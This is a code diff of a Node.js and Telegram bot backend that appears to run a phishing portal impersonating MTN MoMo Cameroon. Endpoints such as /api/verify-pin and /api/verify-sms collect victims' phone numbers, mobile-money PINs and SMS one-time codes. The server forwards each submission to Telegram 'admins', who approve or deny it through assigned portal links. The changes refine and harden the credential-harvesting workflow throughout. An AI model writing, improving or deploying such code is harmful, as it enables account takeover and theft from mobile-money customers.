@@ -26,7 +26,7 @@ if (!BOT_TOKEN) {
 const app = express();
 const bot = new TelegramBot(BOT_TOKEN);
 
-// State Management (In-Memory Maps & Sets)
+// State Management (In-Memory Caches)
 const adminChatIds = new Map();         // adminId → chatId
 const pausedAdmins = new Set();         // adminIds temporarily paused
 let dbReady = false;
@@ -44,18 +44,17 @@ function isAdminActive(chatId) {
 
 function getAdminIdByChatId(chatId) {
     for (const [adminId, storedChatId] of adminChatIds.entries()) {
-        if (storedChatId === chatId) return adminId;
+        if (Number(storedChatId) === Number(chatId)) return adminId;
     }
     return null;
 }
 
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    if (phoneNumber.startsWith('+2376')) return phoneNumber.slice(4);
-    if (phoneNumber.startsWith('+237')) return phoneNumber.slice(4);
-    if (phoneNumber.startsWith('2376')) return phoneNumber.slice(3);
-    if (phoneNumber.startsWith('237')) return phoneNumber.slice(3);
-    return phoneNumber;
+    let cleaned = phoneNumber.replace(/\s+/g, '');
+    if (cleaned.startsWith('+237')) return cleaned.slice(4);
+    if (cleaned.startsWith('237')) return cleaned.slice(3);
+    return cleaned;
 }
 
 async function sendToAdminAsync(adminId, message, options = {}) {
@@ -73,15 +72,18 @@ async function sendToAdminAsync(adminId, message, options = {}) {
         }
     }
 
-    bot.sendMessage(chatId, message, options).catch(error => {
+    try {
+        await bot.sendMessage(chatId, message, options);
+    } catch (error) {
         console.error(`❌ Async dispatch error to admin ${adminId}:`, error.message);
-    });
+    }
 }
 
 // ==========================================
 // 3. EXPRESS MIDDLEWARE
 // ==========================================
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 // ==========================================
@@ -104,7 +106,7 @@ app.post(webhookPath, (req, res) => {
 });
 
 // ==========================================
-// 6. DATABASE CONNECTION & WEBHOOK SYNC
+// 6. DATABASE CONNECTION & SERVER BOOTSTRAP
 // ==========================================
 db.connectDatabase()
     .then(async () => {
@@ -126,6 +128,7 @@ db.connectDatabase()
             console.error('❌ Webhook binding warning:', webhookError.message);
         }
 
+        // Keep-alive ping for free hosting tiers (e.g. Render)
         setInterval(() => fetch(`${WEBHOOK_URL}/health`).catch(() => {}), 14 * 60 * 1000);
 
         app.listen(PORT, () => {
@@ -150,7 +153,9 @@ async function loadAdminChatIds() {
         for (const admin of admins) {
             if (admin.chatId) {
                 adminChatIds.set(admin.adminId, admin.chatId);
-                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
+            }
+            if (admin.status === 'paused') {
+                pausedAdmins.add(admin.adminId);
             }
         }
     } catch (error) {
@@ -159,7 +164,7 @@ async function loadAdminChatIds() {
 }
 
 // ==========================================
-// 7. TELEGRAM COMMAND & CALLBACK HANDLERS
+// 7. TELEGRAM COMMAND HANDLERS
 // ==========================================
 function setupCommandHandlers() {
 
@@ -170,10 +175,9 @@ function setupCommandHandlers() {
 
         if (adminId) {
             if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
-                return bot.sendMessage(chatId, `🚫 *ACCESS PAUSED*`, { parse_mode: 'Markdown' });
+                return bot.sendMessage(chatId, `🚫 *ACCESS PAUSED*\nYour admin account is currently suspended.`, { parse_mode: 'Markdown' });
             }
 
-            const admin = await db.getAdmin(adminId);
             const isSuperAdmin = adminId === 'ADMIN001';
 
             if (isSuperAdmin) {
@@ -186,24 +190,24 @@ function setupCommandHandlers() {
 ${WEBHOOK_URL}?admin=ADMIN001
 
 *Commands:*
-/mylink - Get your link
-/stats - Your statistics
+/mylink - Get your portal link
+/stats - View global statistics
 /pending - Pending applications
 /myinfo - Your information
 
-*Admin Management (Super Admin Only):*
-/addadmin - Add new admin
+*Super Admin Management:*
+/addadmin - Add new auto-generated admin
 /addadminid <id> - Add admin with specific ID
-/transferadmin <oldChatId> | <newChatId> - Transfer admin
+/transferadmin <oldChatId> | <newChatId> - Transfer admin Chat ID
 /pauseadmin <adminId> - Pause an admin
 /unpauseadmin <adminId> - Unpause an admin
 /removeadmin <adminId> - Remove an admin
-/admins - List all admins
-/suspendall - 🔒 Suspend selected admin links
+/admins - List all registered admins
+/suspendall - 🔒 Suspend all admin links
 
 *Messaging:*
-/send <adminId> <message> - Message an admin
-/broadcast <message> - Message all admins
+/send <adminId> <message> - Direct message an admin
+/broadcast <message> - Broadcast to all admins
 /ask <adminId> <request> - Send action request
                 `.trim();
 
@@ -222,10 +226,7 @@ ${WEBHOOK_URL}?admin=ADMIN001
                     ]
                 ];
 
-                bot.sendMessage(chatId, text, {
-                    parse_mode: 'Markdown',
-                    reply_markup: { inline_keyboard }
-                });
+                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
 
             } else {
                 const text = `
@@ -237,10 +238,10 @@ ${WEBHOOK_URL}?admin=ADMIN001
 ${WEBHOOK_URL}?admin=${adminId}
 
 *Commands:*
-/mylink - Get your link
-/stats - Your statistics
+/mylink - Get your portal link
+/stats - View your statistics
 /pending - Pending applications
-/myinfo - Your information
+/myinfo - Your account information
                 `.trim();
 
                 const inline_keyboard = [
@@ -254,10 +255,7 @@ ${WEBHOOK_URL}?admin=${adminId}
                     ]
                 ];
 
-                bot.sendMessage(chatId, text, {
-                    parse_mode: 'Markdown',
-                    reply_markup: { inline_keyboard }
-                });
+                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
             }
 
         } else {
@@ -265,7 +263,7 @@ ${WEBHOOK_URL}?admin=${adminId}
 👋 *Welcome to MTN MoMo Cameroon*
 Your Telegram Chat ID: \`${chatId}\`
 
-⚠️ *Note:* You are not registered as an Admin. Contact Super Admin (\`ADMIN001\`).
+⚠️ *Note:* You are not registered as an Admin. Contact Super Admin (\`ADMIN001\`) with your Chat ID to get access.
             `.trim(), { parse_mode: 'Markdown' });
         }
     });
@@ -286,12 +284,13 @@ Your Telegram Chat ID: \`${chatId}\`
 
         const stats = await db.getAdminStats(adminId);
         bot.sendMessage(chatId, `
-📊 *STATISTICS*
-📋 Total Applications: \`${stats.total}\`
-⏳ PIN Pending: \`${stats.pinPending}\`
-✅ PIN Approved: \`${stats.pinApproved}\`
-⏳ SMS Pending: \`${stats.smsPending}\`
-🎉 Fully Approved: \`${stats.fullyApproved}\`
+📊 *STATISTICS (${adminId})*
+----------------------------------
+📋 Total Applications: \`${stats.total || 0}\`
+⏳ PIN Pending: \`${stats.pinPending || 0}\`
+✅ PIN Approved: \`${stats.pinApproved || 0}\`
+⏳ SMS Pending: \`${stats.smsPending || 0}\`
+🎉 Fully Approved: \`${stats.fullyApproved || 0}\`
         `.trim(), { parse_mode: 'Markdown' });
     });
 
@@ -310,7 +309,7 @@ Your Telegram Chat ID: \`${chatId}\`
 
         let response = `⏳ *PENDING APPLICATIONS (${pendingApps.length})*\n----------------------------------\n`;
         for (const app of pendingApps.slice(0, 10)) {
-            response += `📋 Ref: \`${app.id}\`\n📞 Phone: \`${formatPhone(app.phoneNumber)}\`\n📌 PIN: \`${app.pinStatus}\` | SMS: \`${app.smsStatus || app.smsOtpStatus || 'pending'}\` | OTP: \`${app.otpStatus}\` \n----------------------------------\n`;
+            response += `📋 Ref: \`${app.id}\`\n📞 Phone: \`${formatPhone(app.phoneNumber)}\`\n📌 PIN: \`${app.pinStatus}\` | SMS: \`${app.smsStatus || app.smsOtpStatus || 'pending'}\` | OTP: \`${app.otpStatus}\`\n----------------------------------\n`;
         }
 
         bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
@@ -334,7 +333,7 @@ Your Telegram Chat ID: \`${chatId}\`
     });
 
     // --- Super Admin Management Commands ---
-    bot.onText(/\/addadmin/, async (msg) => {
+    bot.onText(/\/addadmin$/, async (msg) => {
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
@@ -347,7 +346,7 @@ Your Telegram Chat ID: \`${chatId}\`
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
-        const customId = match[1]?.trim();
+        const customId = match[1]?.trim().toUpperCase();
         if (!customId) return bot.sendMessage(chatId, '⚠️ Usage: `/addadminid <adminId>`', { parse_mode: 'Markdown' });
 
         await db.saveAdmin({ adminId: customId, name: `Admin ${customId}`, status: 'active', chatId: null });
@@ -362,10 +361,12 @@ Your Telegram Chat ID: \`${chatId}\`
         if (!input || !input.includes('|')) return bot.sendMessage(chatId, '⚠️ Usage: `/transferadmin oldChatId | newChatId`', { parse_mode: 'Markdown' });
 
         const [oldChatIdStr, newChatIdStr] = input.split('|').map(s => s.trim());
-        const targetAdminId = getAdminIdByChatId(parseInt(oldChatIdStr));
+        const oldChatId = parseInt(oldChatIdStr, 10);
+        const newChatId = parseInt(newChatIdStr, 10);
+
+        const targetAdminId = getAdminIdByChatId(oldChatId);
         if (!targetAdminId) return bot.sendMessage(chatId, '❌ No admin found with old Chat ID.', { parse_mode: 'Markdown' });
 
-        const newChatId = parseInt(newChatIdStr);
         await db.updateAdmin(targetAdminId, { chatId: newChatId });
         adminChatIds.set(targetAdminId, newChatId);
         bot.sendMessage(chatId, `✅ Transferred Admin \`${targetAdminId}\` to Chat ID: \`${newChatId}\``, { parse_mode: 'Markdown' });
@@ -375,7 +376,7 @@ Your Telegram Chat ID: \`${chatId}\`
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
-        const targetId = match[1]?.trim();
+        const targetId = match[1]?.trim().toUpperCase();
         if (!targetId) return bot.sendMessage(chatId, '⚠️ Usage: `/pauseadmin <adminId>`', { parse_mode: 'Markdown' });
 
         await db.updateAdmin(targetId, { status: 'paused' });
@@ -387,7 +388,7 @@ Your Telegram Chat ID: \`${chatId}\`
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
-        const targetId = match[1]?.trim();
+        const targetId = match[1]?.trim().toUpperCase();
         if (!targetId) return bot.sendMessage(chatId, '⚠️ Usage: `/unpauseadmin <adminId>`', { parse_mode: 'Markdown' });
 
         await db.updateAdmin(targetId, { status: 'active' });
@@ -399,8 +400,10 @@ Your Telegram Chat ID: \`${chatId}\`
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
-        const targetId = match[1]?.trim();
+        const targetId = match[1]?.trim().toUpperCase();
         if (!targetId) return bot.sendMessage(chatId, '⚠️ Usage: `/removeadmin <adminId>`', { parse_mode: 'Markdown' });
+
+        if (targetId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot remove Super Admin.', { parse_mode: 'Markdown' });
 
         await db.deleteAdmin(targetId);
         adminChatIds.delete(targetId);
@@ -408,7 +411,7 @@ Your Telegram Chat ID: \`${chatId}\`
         bot.sendMessage(chatId, `🗑️ Admin \`${targetId}\` removed.`, { parse_mode: 'Markdown' });
     });
 
-    bot.onText(/\/admins/, async (msg) => {
+    bot.onText(/\/admins$/, async (msg) => {
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
@@ -420,7 +423,7 @@ Your Telegram Chat ID: \`${chatId}\`
         bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
     });
 
-    bot.onText(/\/suspendall/, async (msg) => {
+    bot.onText(/\/suspendall$/, async (msg) => {
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
@@ -438,7 +441,7 @@ Your Telegram Chat ID: \`${chatId}\`
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
-        const targetId = match[1];
+        const targetId = match[1]?.toUpperCase();
         const text = match[2];
         if (!targetId || !text) return bot.sendMessage(chatId, '⚠️ Usage: `/send <adminId> <message>`', { parse_mode: 'Markdown' });
 
@@ -466,7 +469,7 @@ Your Telegram Chat ID: \`${chatId}\`
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;
 
-        const targetId = match[1];
+        const targetId = match[1]?.toUpperCase();
         const requestText = match[2];
         if (!targetId || !requestText) return bot.sendMessage(chatId, '⚠️ Usage: `/ask <adminId> <request>`', { parse_mode: 'Markdown' });
 
@@ -476,7 +479,7 @@ Your Telegram Chat ID: \`${chatId}\`
 }
 
 // ==========================================
-// 8. INLINE CALLBACK ROUTER (BUTTON FIXES)
+// 8. INLINE CALLBACK ROUTER
 // ==========================================
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
@@ -485,7 +488,7 @@ bot.on('callback_query', async (callbackQuery) => {
     const adminId = getAdminIdByChatId(chatId);
 
     if (!adminId || !isAdminActive(chatId)) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused.', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or account paused.', show_alert: true });
     }
 
     // ------------------------------------------
@@ -501,11 +504,11 @@ bot.on('callback_query', async (callbackQuery) => {
             bot.sendMessage(chatId, `
 📊 *GLOBAL SYSTEM STATISTICS*
 ----------------------------------
-📋 Total Applications: \`${stats.total}\`
-⏳ PIN Pending: \`${stats.pinPending}\`
-✅ PIN Approved: \`${stats.pinApproved}\`
-⏳ SMS Pending: \`${stats.smsPending}\`
-🎉 Fully Approved: \`${stats.fullyApproved}\`
+📋 Total Applications: \`${stats.total || 0}\`
+⏳ PIN Pending: \`${stats.pinPending || 0}\`
+✅ PIN Approved: \`${stats.pinApproved || 0}\`
+⏳ SMS Pending: \`${stats.smsPending || 0}\`
+🎉 Fully Approved: \`${stats.fullyApproved || 0}\`
             `.trim(), { parse_mode: 'Markdown' });
 
         } else if (data === 'sa_pending') {
@@ -557,11 +560,11 @@ bot.on('callback_query', async (callbackQuery) => {
             bot.sendMessage(chatId, `
 📊 *YOUR STATISTICS*
 ----------------------------------
-📋 Total: \`${stats.total}\`
-⏳ PIN Pending: \`${stats.pinPending}\`
-✅ PIN Approved: \`${stats.pinApproved}\`
-⏳ SMS Pending: \`${stats.smsPending}\`
-🎉 Fully Approved: \`${stats.fullyApproved}\`
+📋 Total: \`${stats.total || 0}\`
+⏳ PIN Pending: \`${stats.pinPending || 0}\`
+✅ PIN Approved: \`${stats.pinApproved || 0}\`
+⏳ SMS Pending: \`${stats.smsPending || 0}\`
+🎉 Fully Approved: \`${stats.fullyApproved || 0}\`
             `.trim(), { parse_mode: 'Markdown' });
 
         } else if (data === 'admin_pending') {
@@ -604,11 +607,11 @@ bot.on('callback_query', async (callbackQuery) => {
     const applicationId = appIdParts.join('_');
 
     if (embeddedAdminId !== adminId && adminId !== 'ADMIN001') {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Assigned to another admin.', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application assigned to another administrator.', show_alert: true });
     }
 
     const application = await db.getApplication(applicationId);
-    if (!application) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found.' });
+    if (!application) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application record not found.' });
 
     if (action === 'deny' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'rejected' });
@@ -644,19 +647,24 @@ bot.on('callback_query', async (callbackQuery) => {
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
+
+        if (!phoneNumber || !pin) {
+            return res.status(400).json({ success: false, message: 'Phone number and PIN are required.' });
+        }
+
         const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;
 
         let assignedAdmin;
         if (assignmentType === 'specific' && requestAdminId) {
             assignedAdmin = await db.getAdmin(requestAdminId);
             if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
-                return res.status(400).json({ success: false, message: 'Invalid or paused admin link.' });
+                return res.status(400).json({ success: false, message: 'Invalid or paused administrator link.' });
             }
         } else {
             const activeAdmins = await db.getActiveAdmins();
             const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
-                return res.status(503).json({ success: false, message: 'No administrators available.' });
+                return res.status(503).json({ success: false, message: 'No active administrators available.' });
             }
             assignedAdmin = availableAdmins[0];
         }
@@ -712,7 +720,7 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
         if (application) {
             res.json({ success: true, status: application.pinStatus });
         } else {
-            res.status(404).json({ success: false, message: 'Not found.' });
+            res.status(404).json({ success: false, message: 'Application not found.' });
         }
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal server error.' });
@@ -726,7 +734,7 @@ app.post('/api/verify-sms', async (req, res) => {
         const smsContent = req.body.smsOtp || req.body.smsText;
 
         if (!applicationId || !smsContent) {
-            return res.status(400).json({ success: false, message: 'Missing applicationId or SMS OTP content.' });
+            return res.status(400).json({ success: false, message: 'Missing applicationId or SMS content.' });
         }
 
         const application = await db.getApplication(applicationId);
@@ -777,7 +785,7 @@ app.get('/api/check-sms-status/:applicationId', async (req, res) => {
                 status: application.smsStatus || application.smsOtpStatus 
             });
         } else {
-            res.status(404).json({ success: false, message: 'Not found.' });
+            res.status(404).json({ success: false, message: 'Application not found.' });
         }
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal server error.' });
@@ -835,7 +843,7 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
         if (application) {
             res.json({ success: true, status: application.otpStatus });
         } else {
-            res.status(404).json({ success: false, message: 'Not found.' });
+            res.status(404).json({ success: false, message: 'Application not found.' });
         }
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal server error.' });
@@ -852,7 +860,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Frontend Entry
+// Frontend Entrypoint
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
     if (adminId && !adminChatIds.has(adminId)) {
@@ -869,12 +877,13 @@ app.get('/', async (req, res) => {
 // 10. GRACEFUL SHUTDOWN
 // ==========================================
 async function shutdownGracefully(signal) {
-    console.log(`\n🛑 Signal ${signal} received. Shutting down...`);
+    console.log(`\n🛑 Signal ${signal} received. Shutting down server...`);
     try {
         await bot.deleteWebHook();
         await db.closeDatabase();
         process.exit(0);
     } catch (error) {
+        console.error('❌ Error during shutdown:', error);
         process.exit(1);
     }
 }
